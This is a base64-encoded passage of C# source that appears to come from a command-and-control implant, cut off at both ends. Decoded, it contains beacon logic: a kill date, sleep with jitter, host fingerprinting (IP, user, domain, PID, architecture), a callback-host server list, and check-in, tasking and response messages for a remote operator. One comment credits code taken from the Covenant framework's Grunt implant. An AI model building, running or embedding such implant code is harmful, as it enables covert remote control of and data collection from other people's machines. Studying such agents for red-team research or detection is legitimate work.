CAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIFJlbW92ZUpvYihKb2IgSm9iLCBKb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAiZG93bmxvYWQiKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgSm9iTGlzdC5qb2JzLlJlbW92ZShKb2IpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkLkFib3J0KCk7DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5SZW1vdmUoSm9iKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBDaGVja0RhdGUoKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBEYXRlVGltZSBraWxsID0gRGF0ZVRpbWUuUGFyc2UoQ29uZmlnLktpbGxEYXRlKTsNCiAgICAgICAgICAgICAgICBEYXRlVGltZSBkYXRlID0gRGF0ZVRpbWUuVG9kYXk7DQogICAgICAgICAgICAgICAgaWYgKERhdGVUaW1lLkNvbXBhcmUoa2lsbCwgZGF0ZSkgPj0gMCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgR2V0RHdlbGxUaW1lKCkNCiAgICAgICAgew0KICAgICAgICAgICAgZG91YmxlIEhpZ2ggPSBDb25maWcuU2xlZXAgKyAoQ29uZmlnLlNsZWVwICogKENvbmZpZy5KaXR0ZXIgKiAwLjAxKSk7DQogICAgICAgICAgICBkb3VibGUgTG93ID0gQ29uZmlnLlNsZWVwIC0gKENvbmZpZy5TbGVlcCAqIChDb25maWcuSml0dGVyICogMC4wMSkpOw0KICAgICAgICAgICAgUmFuZG9tIHJhbmRvbSA9IG5ldyBSYW5kb20oKTsNCiAgICAgICAgICAgIGludCBEd2VsbCA9IHJhbmRvbS5OZXh0KENvbnZlcnQuVG9JbnQzMihMb3cpLCBDb252ZXJ0LlRvSW50MzIoSGlnaCkpOw0KICAgICAgICAgICAgcmV0dXJuIER3ZWxsICogMTAwMDsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldElQQWRkcmVzcygpDQogICAgICAgIHsNCiAgICAgICAgICAgIElQSG9zdEVudHJ5IEhvc3QgPSBkZWZhdWx0KElQSG9zdEVudHJ5KTsNCiAgICAgICAgICAgIHN0cmluZyBIb3N0bmFtZSA9IG51bGw7DQogICAgICAgICAgICBIb3N0bmFtZSA9IFN5c3RlbS5FbnZpcm9ubWVudC5NYWNoaW5lTmFtZTsNCiAgICAgICAgICAgIEhvc3QgPSBEbnMuR2V0SG9zdEVudHJ5KEhvc3RuYW1lKTsNCiAgICAgICAgICAgIHN0cmluZyBpcCA9ICIiOw0KICAgICAgICAgICAgZm9yZWFjaCAoSVBBZGRyZXNzIElQIGluIEhvc3QuQWRkcmVzc0xpc3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKElQLkFkZHJlc3NGYW1pbHkgPT0gU3lzdGVtLk5ldC5Tb2NrZXRzLkFkZHJlc3NGYW1pbHkuSW50ZXJOZXR3b3JrKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaXAgPSBDb252ZXJ0LlRvU3RyaW5nKElQKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gaXA7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRBcmNoKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGFyY2ggPSAiIjsNCiAgICAgICAgICAgIGlmIChJbnRQdHIuU2l6ZSA9PSA4KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGFyY2ggPSAieDY0IjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhcmNoID0gIng4NiI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gYXJjaDsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFNlc3Npb25JZCgpDQogICAgICAgIHsNCiAgICAgICAgICAgIFJhbmRvbSByYW5kb20gPSBuZXcgUmFuZG9tKCk7DQogICAgICAgICAgICBjb25zdCBzdHJpbmcgY2hhcnMgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsNCiAgICAgICAgICAgIHJldHVybiBuZXcgc3RyaW5nKEVudW1lcmFibGUuUmVwZWF0KGNoYXJzLCAyMCkuU2VsZWN0KHMgPT4gc1tyYW5kb20uTmV4dChzLkxlbmd0aCldKS5Ub0FycmF5KCkpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gU3RvbGUgZnJvbSBDb3ZlbmFudCdzIEdydW50DQogICAgICAgIC8vIEFkYXB0ZWQgZnJvbSBodHRwczovL2dpdGh1Yi5jb20vbW9uby9tb25vL2Jsb2IvbWFzdGVyL21jcy9jbGFzcy9TeXN0ZW0uV2ViL1N5c3RlbS5XZWIvSHR0cFV0aWxpdHkuY3MNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShzdHJpbmcgdmFsdWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChTdHJpbmcuSXNOdWxsT3JFbXB0eSh2YWx1ZSkpIHsgcmV0dXJuIFN0cmluZy5FbXB0eTsgfQ0KICAgICAgICAgICAgaW50IGxlbiA9IHZhbHVlLkxlbmd0aDsNCiAgICAgICAgICAgIGJvb2wgbmVlZEVuY29kZSA9IGZhbHNlOw0KICAgICAgICAgICAgY2hhciBjOw0KICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBsZW47IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjID0gdmFsdWVbaV07DQogICAgICAgICAgICAgICAgaWYgKGMgPj0gMCAmJiBjIDw9IDMxIHx8IGMgPT0gMzQgfHwgYyA9PSAzOSB8fCBjID09IDYwIHx8IGMgPT0gNjIgfHwgYyA9PSA5MikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIG5lZWRFbmNvZGUgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoIW5lZWRFbmNvZGUpIHsgcmV0dXJuIHZhbHVlOyB9DQoNCiAgICAgICAgICAgIHZhciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7DQogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGxlbjsgaSsrKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGMgPSB2YWx1ZVtpXTsNCiAgICAgICAgICAgICAgICBpZiAoYyA+PSAwICYmIGMgPD0gNyB8fCBjID09IDExIHx8IGMgPj0gMTQgJiYgYyA8PSAzMSB8fCBjID09IDM5IHx8IGMgPT0gNjAgfHwgYyA9PSA2MikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZEZvcm1hdCgiXFx1ezA6eDR9IiwgKGludCljKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgoaW50KWMpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgODoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcYiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFx0Iik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDEwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFxuIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDEyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFxmIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDEzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFxyIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDM0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFxcIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA5MjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcXFwiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKGMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHNiLlRvU3RyaW5nKCk7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgR2V0U2VydmVycygpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyBkb21haW4gaW4gQ29uZmlnLkNhbGxiYWNrSG9zdHMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgU2VydmVyIHNlcnZlciA9IG5ldyBTZXJ2ZXINCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGRvbWFpbiA9IGRvbWFpbiwNCiAgICAgICAgICAgICAgICAgICAgY291bnQgPSAwDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICBDb25maWcuU2VydmVycy5BZGQoc2VydmVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBTZXJ2ZXINCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBkb21haW4geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjb3VudCB7IGdldDsgc2V0OyB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgQ2hlY2tJbg0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGlwIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgb3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB1c2VyIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgaG9zdCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGRvbWFpbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHBpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHV1aWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhcmNoaXRlY3R1cmUgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIiaXAiIjoiInsxfSIiLCIib3MiIjoiInsyfSIiLCIidXNlciIiOiIiezN9IiIsIiJob3N0IiI6IiJ7NH0iIiwiImRvbWFpbiIiOiIiezV9IiIsIiJwaWQiIjp7Nn0sIiJ1dWlkIiI6IiJ7N30iIiwiImFyY2hpdGVjdHVyZSIiOiIiezh9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihDaGVja0luIGNoZWNraW4pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoDQogICAgICAgICAgICAgICAgICAgIGNoZWNraW4uSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5pcCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5vcyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi51c2VyKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLmhvc3QpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4uZG9tYWluKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLnBpZC5Ub1N0cmluZygpKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLnV1aWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4uYXJjaGl0ZWN0dXJlKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBDaGVja0luUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHN0YXR1cyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIENoZWNrSW5SZXNwb25zZUZvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiImlkIiI6ICIiezF9IiIsICIiYWN0aW9uIiI6ICIiezJ9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBDaGVja0luUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IENoZWNrSW5SZXNwb25zZS5QYXJzZShtZXNzYWdlLCBDaGVja0luUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBDaGVja0luUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0VGFza2luZw0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHRhc2tpbmdfc2l6ZSB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJ0YXNraW5nX3NpemUiIjp7MX19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihHZXRUYXNraW5nIGdldF90YXNraW5nKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBnZXRfdGFza2luZy5Kc29uRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF90YXNraW5nLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3Rhc2tpbmcudGFza2luZ19zaXplLlRvU3RyaW5nKCkpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBHZXRUYXNraW5nUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8VGFzaz4gdGFza3MgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgR2V0VGFza2luZ1Jlc3BvbnNlKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0YXNrcyA9IG5ldyBMaXN0PFRhc2s+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFRhc2tpbmdSZXNwb25zZUZvcm1hdCA9IEAie3siImFjdGlvbiIiOiAiInswfSIiLCAiInRhc2tzIiI6IHsxfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIEdldFRhc2tpbmdSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gR2V0VGFza2luZ1Jlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIEdldFRhc2tpbmdSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEdldFRhc2tpbmdSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICB0YXNrcyA9IFRhc2suUGFyc2VUYXNrcyhwYXJzZUxpc3RbMV0pDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBQb3N0UmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8VGFza1Jlc3BvbnNlPiByZXNwb25zZXMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgUG9zdFJlc3BvbnNlKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXNwb25zZXMgPSBuZXcgTGlzdDxUYXNrUmVzcG9uc2U+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJyZXNwb25zZXMiIjpbezF9XX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKFBvc3RSZXNwb25zZSBwb3N0X3Jlc3BvbnNlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyByZXNwb25zZXMgPSAiIjsNCiAgICAgICAgICAgICAgICBpbnQgY291bnQgPSAwOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFRhc2tSZXNwb25zZSB0YXNrX3Jlc3BvbnNlIGluIHBvc3RfcmVzcG9uc2UucmVzcG9uc2VzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKChjb3VudCArIDEpID09IHBvc3RfcmVzcG9uc2UucmVzcG9uc2VzLkNvdW50KQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgKz0gVGFza1Jlc3BvbnNlLlRvSnNvbih0YXNrX3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyArPSBUYXNrUmVzcG9uc2UuVG9Kc29uKHRhc2tfcmVzcG9uc2UpICsgJywnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICsrY291bnQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiAie1wiYWN0aW9uXCI6IFwiIiArIHBvc3RfcmVzcG9uc2UuYWN0aW9uICsgIlwiLCBcInJlc3BvbnNlc1wiOiBbIiArIHJlc3BvbnNlcyArICJdfSI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUG9zdFJlc3BvbnNlUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8UmVzcG9uc2U+IHJlc3BvbnNlcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBQb3N0UmVzcG9uc2VSZXNwb25zZSgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzcG9uc2VzID0gbmV3IExpc3Q8UmVzcG9uc2U+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFBvc3RSZXNwb25zZVJlc3BvbnNlRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6ICIiezB9IiIsICIicmVzcG9uc2VzIiI6IHsxfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3V